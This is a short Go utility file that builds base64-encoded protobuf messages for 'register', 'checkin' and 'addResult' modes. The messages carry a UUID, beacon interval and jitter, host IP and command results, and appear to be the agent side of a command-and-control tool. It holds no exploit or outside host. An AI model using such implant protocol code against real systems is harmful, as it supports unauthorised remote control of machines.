package utils

import (
	"encoding/base64"
	"github.com/degenerat3/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	goUUID "github.com/google/uuid"
)

func genRegisterRaw(interval int, delta int, regFile string, obfText string) []byte {
	uuid := goUUID.New().String()
	storeUUID(regFile, uuid, obfText)
	hostname := getIP()
	pro := &mcs.MCS{
		Uuid:     uuid,
		Interval: int32(interval),
		Delta:    int32(delta),
		Hostname: hostname,
		Mode:     "register",
	}
	data, _ := proto.Marshal(pro)
	return data
}

// GenRegister returns b64 of the registration payload
func GenRegister(interval int, delta int, regFile string, obfText string) string {
	data := genRegisterRaw(interval, delta, regFile, obfText)
	encoded := encodePayload(data)
	return encoded
}

// GenRegisterRaw returns raw MCS bytes of registration payload
func GenRegisterRaw(interval int, delta int, regFile string, obfText string) []byte {
	return genRegisterRaw(interval, delta, regFile, obfText)

}

func genCheckinRaw(regFile string, obfText string) []byte {
	uuid := fetchUUID(regFile, obfText)
	pro := &mcs.MCS{
		Uuid: uuid,
		Mode: "checkin",
	}
	data, _ := proto.Marshal(pro)
	return data
}

// GenCheckin returns the b64 of the "check in" payload
func GenCheckin(regFile string, obfText string) string {
	data := genCheckinRaw(regFile, obfText)
	encoded := encodePayload(data)
	return encoded
}

// GenCheckinRaw returns the raw MCS bytes of the "check in" payload
func GenCheckinRaw(regFile string, obfText string) []byte {
	return genCheckinRaw(regFile, obfText)
}

func genAddResultRaw(uuid string, result string) []byte {
	pro := &mcs.MCS{
		Uuid:   uuid,
		Result: result,
		Mode:   "addResult",
	}
	data, _ := proto.Marshal(pro)
	return data
}

// GenAddResult returns the b64 of the "result add" payload
func GenAddResult(uuid string, result string) string {
	data := genAddResultRaw(uuid, result)
	encoded := encodePayload(data)
	return encoded
}

// GenAddResultRaw returns the raw MCS bytes of the "result add" payload
func GenAddResultRaw(uuid string, result string) []byte {
	return genAddResultRaw(uuid, result)
}

func encodePayload(proto []byte) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(proto))
	encoded = encoded + "\n"
	return encoded
}

// EncodePayload is the exported version of the marshal'd protobuf to base64 encoder
func EncodePayload(proto []byte) string {
	return encodePayload(proto)
}
